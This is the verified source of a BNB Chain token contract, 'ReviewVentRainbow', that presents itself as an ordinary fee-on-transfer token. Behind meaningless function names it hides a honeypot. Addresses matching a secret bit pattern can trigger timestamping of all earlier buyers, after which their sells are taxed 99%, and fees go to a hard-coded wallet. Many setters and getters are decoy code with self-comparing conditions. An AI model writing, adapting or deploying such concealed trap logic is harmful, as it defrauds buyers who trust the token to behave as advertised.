/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ReviewVentRainbow is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Review Vent Rainbow ";
    string constant _symbol = "ReviewVentRainbow";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private limitReceiverTxExemptSell;
    mapping(address => bool) private burnIsMaxMode;
    mapping(address => bool) private isBuySwapMaxMin;
    mapping(address => bool) private liquiditySellLaunchedLimitReceiver;
    mapping(address => uint256) private burnWalletTradingBuy;
    mapping(uint256 => address) private tradingReceiverLimitMarketing;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptWalletLiquidityReceiver = 0;
    uint256 private isSwapSellLimit = 8;

    //SELL FEES
    uint256 private limitModeTradingIsSellBuy = 0;
    uint256 private sellReceiverLiquidityLaunched = 8;

    uint256 private autoTradingSellSwapMinLaunched = isSwapSellLimit + exemptWalletLiquidityReceiver;
    uint256 private walletBotsSwapMax = 100;

    address private burnWalletLaunchedTrading = (msg.sender); // auto-liq address
    address private botsLimitLiquiditySell = (0xC424Bfe22760ba36f6e86175fFFfC4f05Fa995Eb); // marketing address
    address private buyTxTeamReceiver = DEAD;
    address private botsReceiverLimitTrading = DEAD;
    address private launchedExemptBurnReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private maxTxIsTrading;
    uint256 private minTradingExemptSwapAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private teamLaunchedWalletLiquidityMinIs;
    uint256 private isLimitTeamSwap;
    uint256 private maxBotsTeamReceiverLiquidity;
    uint256 private receiverIsBotsMin;
    uint256 private tradingMaxLaunchedIs;

    bool private receiverFeeAutoSell = true;
    bool private liquiditySellLaunchedLimitReceiverMode = true;
    bool private sellFeeMaxExempt = true;
    bool private buyBotsMaxExempt = true;
    bool private walletMarketingModeBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minFeeExemptLiquidityAutoLimitLaunched = _totalSupply / 1000; // 0.1%

    
    bool private maxSellSwapFeeMarketingWallet;
    uint256 private buyMinReceiverSellLimitBurnTx;
    bool private botsTeamBurnAutoMarketingLiquiditySwap;
    uint256 private minTradingLiquidityTeam;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        teamLaunchedWalletLiquidityMinIs = true;

        limitReceiverTxExemptSell[msg.sender] = true;
        limitReceiverTxExemptSell[address(this)] = true;

        burnIsMaxMode[msg.sender] = true;
        burnIsMaxMode[0x0000000000000000000000000000000000000000] = true;
        burnIsMaxMode[0x000000000000000000000000000000000000dEaD] = true;
        burnIsMaxMode[address(this)] = true;

        isBuySwapMaxMin[msg.sender] = true;
        isBuySwapMaxMin[0x0000000000000000000000000000000000000000] = true;
        isBuySwapMaxMin[0x000000000000000000000000000000000000dEaD] = true;
        isBuySwapMaxMin[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return swapTeamExemptMode(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return swapTeamExemptMode(sender, recipient, amount);
    }

    function swapTeamExemptMode(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = buyMaxMinLiquiditySell(sender) || buyMaxMinLiquiditySell(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                marketingIsAutoLiquidityMin();
            }
            if (!bLimitTxWalletValue) {
                limitWalletSwapTradingLiquidityFeeTeam(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return modeMaxTxExempt(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(receiverFeeAutoSell, "Trading is not active");
        }

        if (!Administration[sender] && !limitReceiverTxExemptSell[sender] && !limitReceiverTxExemptSell[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || isBuySwapMaxMin[sender] || isBuySwapMaxMin[recipient], "Max TX Limit has been triggered");

        if (maxLimitExemptFeeMinIsLaunched()) {exemptModeMinBotsTradingBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = swapModeReceiverMinExempt(sender) ? tradingFeeMinModeBotsReceiver(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeMaxTxExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapModeReceiverMinExempt(address sender) internal view returns (bool) {
        return !burnIsMaxMode[sender];
    }

    function maxReceiverMinExempt(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            autoTradingSellSwapMinLaunched = sellReceiverLiquidityLaunched + limitModeTradingIsSellBuy;
            return burnSellMaxModeWallet(sender, autoTradingSellSwapMinLaunched);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoTradingSellSwapMinLaunched = isSwapSellLimit + exemptWalletLiquidityReceiver;
            return autoTradingSellSwapMinLaunched;
        }
        return burnSellMaxModeWallet(sender, autoTradingSellSwapMinLaunched);
    }

    function tradingFeeMinModeBotsReceiver(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(maxReceiverMinExempt(sender, receiver == uniswapV2Pair)).div(walletBotsSwapMax);

        if (liquiditySellLaunchedLimitReceiver[sender] || liquiditySellLaunchedLimitReceiver[receiver]) {
            feeAmount = amount.mul(99).div(walletBotsSwapMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function buyMaxMinLiquiditySell(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function burnSellMaxModeWallet(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = burnWalletTradingBuy[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitWalletSwapTradingLiquidityFeeTeam(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        tradingReceiverLimitMarketing[exemptLimitValue] = addr;
    }

    function marketingIsAutoLiquidityMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (burnWalletTradingBuy[tradingReceiverLimitMarketing[i]] == 0) {
                    burnWalletTradingBuy[tradingReceiverLimitMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(botsLimitLiquiditySell).transfer(amountBNB * amountPercentage / 100);
    }

    function maxLimitExemptFeeMinIsLaunched() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    walletMarketingModeBurn &&
    _balances[address(this)] >= minFeeExemptLiquidityAutoLimitLaunched;
    }

    function exemptModeMinBotsTradingBurn() internal swapping {
        uint256 amountToLiquify = minFeeExemptLiquidityAutoLimitLaunched.mul(exemptWalletLiquidityReceiver).div(autoTradingSellSwapMinLaunched).div(2);
        uint256 amountToSwap = minFeeExemptLiquidityAutoLimitLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoTradingSellSwapMinLaunched.sub(exemptWalletLiquidityReceiver.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptWalletLiquidityReceiver).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isSwapSellLimit).div(totalETHFee);

        payable(botsLimitLiquiditySell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                burnWalletLaunchedTrading,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTradingReceiverLimitMarketing(uint256 a0) public view returns (address) {
        if (a0 == walletBotsSwapMax) {
            return burnWalletLaunchedTrading;
        }
        if (a0 == exemptWalletLiquidityReceiver) {
            return botsReceiverLimitTrading;
        }
            return tradingReceiverLimitMarketing[a0];
    }
    function setTradingReceiverLimitMarketing(uint256 a0,address a1) public onlyOwner {
        if (tradingReceiverLimitMarketing[a0] != tradingReceiverLimitMarketing[a0]) {
           tradingReceiverLimitMarketing[a0]=a1;
        }
        if (tradingReceiverLimitMarketing[a0] == tradingReceiverLimitMarketing[a0]) {
           tradingReceiverLimitMarketing[a0]=a1;
        }
        tradingReceiverLimitMarketing[a0]=a1;
    }

    function getLimitReceiverTxExemptSell(address a0) public view returns (bool) {
        if (a0 != burnWalletLaunchedTrading) {
            return walletMarketingModeBurn;
        }
        if (a0 != burnWalletLaunchedTrading) {
            return buyBotsMaxExempt;
        }
        if (a0 != burnWalletLaunchedTrading) {
            return sellFeeMaxExempt;
        }
            return limitReceiverTxExemptSell[a0];
    }
    function setLimitReceiverTxExemptSell(address a0,bool a1) public onlyOwner {
        if (limitReceiverTxExemptSell[a0] == isBuySwapMaxMin[a0]) {
           isBuySwapMaxMin[a0]=a1;
        }
        limitReceiverTxExemptSell[a0]=a1;
    }

    function getMinFeeExemptLiquidityAutoLimitLaunched() public view returns (uint256) {
        if (minFeeExemptLiquidityAutoLimitLaunched == autoTradingSellSwapMinLaunched) {
            return autoTradingSellSwapMinLaunched;
        }
        if (minFeeExemptLiquidityAutoLimitLaunched == sellReceiverLiquidityLaunched) {
            return sellReceiverLiquidityLaunched;
        }
        if (minFeeExemptLiquidityAutoLimitLaunched == autoTradingSellSwapMinLaunched) {
            return autoTradingSellSwapMinLaunched;
        }
        return minFeeExemptLiquidityAutoLimitLaunched;
    }
    function setMinFeeExemptLiquidityAutoLimitLaunched(uint256 a0) public onlyOwner {
        if (minFeeExemptLiquidityAutoLimitLaunched != exemptWalletLiquidityReceiver) {
            exemptWalletLiquidityReceiver=a0;
        }
        minFeeExemptLiquidityAutoLimitLaunched=a0;
    }

    function getWalletBotsSwapMax() public view returns (uint256) {
        if (walletBotsSwapMax == minFeeExemptLiquidityAutoLimitLaunched) {
            return minFeeExemptLiquidityAutoLimitLaunched;
        }
        if (walletBotsSwapMax == isSwapSellLimit) {
            return isSwapSellLimit;
        }
        if (walletBotsSwapMax == sellReceiverLiquidityLaunched) {
            return sellReceiverLiquidityLaunched;
        }
        return walletBotsSwapMax;
    }
    function setWalletBotsSwapMax(uint256 a0) public onlyOwner {
        if (walletBotsSwapMax == minFeeExemptLiquidityAutoLimitLaunched) {
            minFeeExemptLiquidityAutoLimitLaunched=a0;
        }
        walletBotsSwapMax=a0;
    }

    function getIsSwapSellLimit() public view returns (uint256) {
        if (isSwapSellLimit != minFeeExemptLiquidityAutoLimitLaunched) {
            return minFeeExemptLiquidityAutoLimitLaunched;
        }
        return isSwapSellLimit;
    }
    function setIsSwapSellLimit(uint256 a0) public onlyOwner {
        if (isSwapSellLimit != isSwapSellLimit) {
            isSwapSellLimit=a0;
        }
        if (isSwapSellLimit == isSwapSellLimit) {
            isSwapSellLimit=a0;
        }
        if (isSwapSellLimit == sellReceiverLiquidityLaunched) {
            sellReceiverLiquidityLaunched=a0;
        }
        isSwapSellLimit=a0;
    }

    function getReceiverFeeAutoSell() public view returns (bool) {
        return receiverFeeAutoSell;
    }
    function setReceiverFeeAutoSell(bool a0) public onlyOwner {
        receiverFeeAutoSell=a0;
    }

    function getBurnWalletLaunchedTrading() public view returns (address) {
        return burnWalletLaunchedTrading;
    }
    function setBurnWalletLaunchedTrading(address a0) public onlyOwner {
        if (burnWalletLaunchedTrading == buyTxTeamReceiver) {
            buyTxTeamReceiver=a0;
        }
        if (burnWalletLaunchedTrading != burnWalletLaunchedTrading) {
            burnWalletLaunchedTrading=a0;
        }
        if (burnWalletLaunchedTrading != burnWalletLaunchedTrading) {
            burnWalletLaunchedTrading=a0;
        }
        burnWalletLaunchedTrading=a0;
    }

    function getBotsReceiverLimitTrading() public view returns (address) {
        if (botsReceiverLimitTrading == botsReceiverLimitTrading) {
            return botsReceiverLimitTrading;
        }
        return botsReceiverLimitTrading;
    }
    function setBotsReceiverLimitTrading(address a0) public onlyOwner {
        if (botsReceiverLimitTrading != buyTxTeamReceiver) {
            buyTxTeamReceiver=a0;
        }
        if (botsReceiverLimitTrading != launchedExemptBurnReceiver) {
            launchedExemptBurnReceiver=a0;
        }
        if (botsReceiverLimitTrading != launchedExemptBurnReceiver) {
            launchedExemptBurnReceiver=a0;
        }
        botsReceiverLimitTrading=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}